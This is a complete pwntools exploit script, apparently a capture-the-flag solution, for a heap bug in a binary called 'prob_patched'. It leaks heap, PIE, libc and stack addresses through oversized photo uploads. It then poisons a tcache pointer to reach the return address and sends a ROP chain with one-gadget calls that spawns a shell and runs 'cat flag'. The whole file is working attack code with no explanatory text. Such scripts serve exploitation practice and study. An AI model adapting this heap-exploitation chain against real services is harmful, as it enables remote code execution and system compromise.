#!/usr/bin/env python
from pwn import *
from time import sleep


context.binary = e = ELF("prob_patched")
libc = ELF("./libc.so.6")
gs = """
# brva 0x002A18
brva 0x35F6 
"""


def start():
    if args.LOCAL:
        p = e.process()

    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()


def add(idx, name, topic_cnt, topic: list, is_Photo=False, width=0, height=0, photoData=b'', exploit=False):
    p.sendlineafter(b"input:", b"1")
    p.sendlineafter(b"idx? ", str(idx).encode())
    p.sendlineafter(b"name? ", name)
    p.sendlineafter(b"topic cnt? ", str(topic_cnt).encode())

    for i in range(topic_cnt):
        p.sendlineafter(b'topic> ', topic[i])

    if exploit:
        return

    p.recvuntil(b'wanna upload photo? ')
    if is_Photo and width and height:
        p.sendline(b'y')
        p.sendlineafter(b'width? ', str(width).encode())
        p.sendlineafter(b'height? ', str(height).encode())
        p.sendafter(b'reading photo below>>', photoData)
    else:
        p.sendline(b'n')


def show():
    p.sendlineafter(b"input:", b"2")


def remove(idx):
    p.sendlineafter(b"input:", b"3")
    p.sendlineafter(b"idx? ", str(idx).encode())


add(0, b'A'*0x10, 1, [b'AAAAA'], is_Photo=True,
    width=47, height=1, photoData=b'X'*47)

add(1, b'B'*0x10, 1, [b'AAAAA'], is_Photo=True,
    width=47, height=1, photoData=b'X'*47)

add(2, b'C'*0x10, 1, [b'AAAAA'], is_Photo=True,
    width=47, height=1, photoData=b'X'*47)

add(3, b'D'*0x10, 1, [b'AAAAA'], is_Photo=True,
    width=47, height=1, photoData=b'X'*47)

add(4, b'D'*0x10, 1, [b'AAAAA'], is_Photo=True,
    width=47, height=1, photoData=b'X'*47)

add(5, b'5'*0x10, 1, [b'A'*0x80], is_Photo=True,
    width=47, height=1, photoData=b'X'*47)

add(6, b'6'*0x10, 1, [b'A'*0x80], is_Photo=True,
    width=47, height=1, photoData=b'X'*47)

remove(0)


add(0, b'A'*0x10, 1, [b'AAAAA'], is_Photo=True,
    width=65280, height=65280, photoData=p64(0x1337133713371337)*(0x908//8))


p.recvuntil(p64(0x1337133713371337)*(0x908//8))
heap = u64(p.recv(6)+b'\0\0') - 0x12810
log.info("heap: "+hex(heap))


remove(2)
add(2, b'A'*0x10, 1, [b'AAAAA'], is_Photo=True,
    width=65280, height=65280, photoData=p64(0x1337133713371337)*(0x958//8))

p.recvuntil(p64(0x1337133713371337)*(0x958//8))
e.address = u64(p.recv(6)+b'\0\0') - 0x7c80
log.info("pie: " + hex(e.address))


remove(4)
add(4, b'@'*0x10, 1, [b'AAAAA'], is_Photo=True,
    width=65280, height=65280, photoData=p64(0x1337133713371337)*(0x908//8)+p64(heap+0x14e50) + p64(heap+0x14e70)*2+p64(0x31)+p64(e.got.printf)+p64(0x8)+p64(0))

show()

p.recvuntil(b'@'*0x10)
p.recvuntil(b'(topic list)\n')

libc.address = u64(p.recv(8)) - libc.sym.printf
log.info("libc @ " + hex(libc.address))

p.sendline(b"1")

remove(5)


addr = heap+0x14eb8

pl = p64(libc.address+0xebcf5)*3
pl = pl.ljust(0x920)

add(5, b'#'*0x10, 1, [b'AAAAA'], is_Photo=True,
    width=65280, height=65280, photoData=p64(0x1337133713371337)*(0x908//8)+p64(heap+0x157e0) + p64(heap+0x157e0+0x20)*2+p64(0x31)+p64(libc.sym.environ)+p64(0x8)+p64(0))

show()
p.recvuntil(b'(################ logo)\n')
p.recvuntil(b'(topic list)\n')
stack = u64(p.recv(8))
log.info("stack : " + hex(stack))

p.sendline(b'1')
remove(6)

return_addr = stack - 0x1d0
target_chunk = heap + 0x16380

_ = b'\0'*0x20+p64(next(libc.search(b'/bin/sh'))) + \
    b'\0'*0x100 + p64(heap+0x15a48)
_ = _.ljust(0x918, b'\0')

add(6, b'#'*0x10, 0, [b'AAAAA'], is_Photo=True,
    width=65280, height=65280, photoData=_ + p64(0) + p64(0x31) + p64((heap+0x16350) >> 12) + p64(0)*4+p64(0x91) + p64((target_chunk >> 12) ^ (return_addr - 0x28)))


add(7, b'7'*0x10, 1, [b'A'*0x80])

if args.GDB:
    gdb.attach(p, gdbscript=gs)
    pause()


rop = p64(heap+0x15a48+0x50)*5 + p64(libc.address+0x000000000002be51) + p64(0) + \
    p64(libc.address+0x0000000000149ac9) + p64(libc.address+0xebcf8)
rop = rop.ljust(0x50, b'A')
add(8, b'8'*0x10, 1, [rop], exploit=True)
p.sendline(b"cat flag")


p.interactive()
